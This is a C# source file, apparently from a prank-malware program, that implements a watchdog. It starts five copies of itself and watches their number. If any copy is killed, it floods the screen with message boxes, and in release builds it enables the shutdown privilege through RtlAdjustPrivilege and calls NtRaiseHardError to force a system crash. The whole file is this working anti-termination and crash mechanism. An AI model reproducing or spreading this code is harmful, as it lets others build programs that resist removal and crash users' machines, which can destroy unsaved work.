using ëntärtäïnër.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ëntärtäïnër.Native;

namespace ëntärtäïnër
{
    internal static class WatchDog
    {
        private const int Wdc = 5;

        private static readonly string[] KillMessagesArr =
            Resources.KillMessages.Split('\n')
                .Select(s => s.Replace(@"\n", Environment.NewLine)).ToArray();
        
        public static void Run()
        {
            Random rnd = new Random();
            Thread.Sleep(5000);
            string modN = Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location);
            while (true)
                if (Process.GetProcessesByName(modN).Length != Wdc + 1)
                {
                    for (int i = 0; i < 20; i++)
                        Task.Run(() => { MessageBox.Show(KillMessagesArr[rnd.Next(0, KillMessagesArr.Length)]); });
                    Thread.Sleep(4000);
#if DEBUG
                    foreach (Process t in Process.GetProcessesByName(modN))
                        t.Kill();
#else
                    ntdll.RtlAdjustPrivilege(19, true, false, out bool _);
                    ntdll.NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out uint _);
#endif
                }
        }

        public static void CreateWDs()
        {
            for (int i = 0; i < Wdc; i++)
                Process.Start(Assembly.GetExecutingAssembly().Location, "wd");
        }
    }
}
